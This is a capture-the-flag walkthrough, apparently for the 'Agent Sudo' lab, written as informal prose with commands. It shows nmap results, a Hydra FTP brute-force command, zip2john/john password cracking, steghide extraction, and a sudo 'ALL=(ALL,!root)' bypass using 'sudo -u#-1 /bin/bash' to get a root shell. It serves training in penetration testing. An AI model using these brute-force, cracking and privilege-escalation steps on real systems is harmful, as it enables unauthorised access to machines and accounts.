# Agent Sudo 

#### Nmap Scan Results :

```
Nmap scan report for 10.10.191.93
Host is up (0.047s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```

We see there are 3 ports open and then lets go to the link in our browser and there we see a hint for us which says change the se your own <b>codename</b> as user-agent to access the site. So now we can basicallly either use curl or Burp Suite i prefer Burp and here we are gonna change the User agent to C instead of your browser etc. and when we do that we have a possibility to go to the redirected link and see the answer which says ->

```html
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

```
Here we can see that the agents name is chris and they say the password is weak sooooo lets brute force our way in.For which you can use Hydra which is amazing for bruteforcing here is a link for a cheatsheet if you wanna dont have experience with Hydra before and dont understand the syntax from the manual or help. https://github.com/frizb/Hydra-Cheatsheet

```
hydra -t 50 -l chris -P /usr/share/wordlists/rockyou.txt -vV 10.10.191.93 ftp 
```
and now lets wait for the passwords to start rolling in.After all this you should get the password possibly in like 2 min i think and then we have login to ftp with the user as chris and the password we just got 
```
ftp 10.10.191.93
```
and here we see there are 3 files lets get them all to our desktop using the get command and then inspect them each one by one.First lets investigate the text file which says 

Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C

So basicallly here it says there is information inside the images which means there is stegnagraphy involved and for stegnagraphy we have this great tool called steghide that we can use to extract stuff out of a picture basically there is also other tools like binwalk,zsteg etc. 
To download steghide just do a sudo apt install steghide .

Now at first lets try steghide with a basic weak password like password,123456 and see what we get and just ennumerate on these images and see what we can get. So when we use binwalk on cutie.png we find that are hidden files in there like a zip file which really is something we should take a look at.So lets go to that zip file try to unzip it and turns out it has a password sooooo what we will do now is use a tool called John the ripper to crack the password the syntax would go something like this :
```
zip2john 8702 > hash
john hash -w=/usr/share/wordlists/rockyou.txt 
```
then we we get a text file which has the following content -> 
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R

and in here the QXJlYTUx text looks encrypted with base64 and we can just decode like this 

echo QXJlYTUx | base64 --decode 
echo QXJlYTUx | base64 --decode 
After we have this password we just decoded we can go back to the cute-alien.jpg image and use steghide to extract the stuff of there and use the password we just got the syntax for that would be ->
```
steghide --extract -sf cute_alien.jpg 
```
and here we will now get a message.txt file extracted for us which contains credentials for the next steps.If you cat it out you will see ->

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris

now this is what we can use to login SSH and then get the user flag.and then here we have another question which says where is the image from for which we need to reverse search the image using google images to find out the incident.
Now to get the files from ssh we use a tool called scp and syntax for using it would go like this ->

```
scp james@10.10.142.58:/home/james/Alien_autospy.jpg
```
Now lets reverse search this on google images and we find out that the incident was roswell alien autopsy and now lets try priv esc for which we sudo -l in the ssh terminal and we will see it allows us to do this 

james ALL=(ALL,!root) /bin/bash

and this is part of a security bypass exploit if you google search ALL=(ALL,!root) you will see exploit-db page and use sudo -u#-1 /bin/bash and this will get you a root shell and then traverse over to /root/ and cat out the root.txt flag to see Agent R's name and the root flag.
 


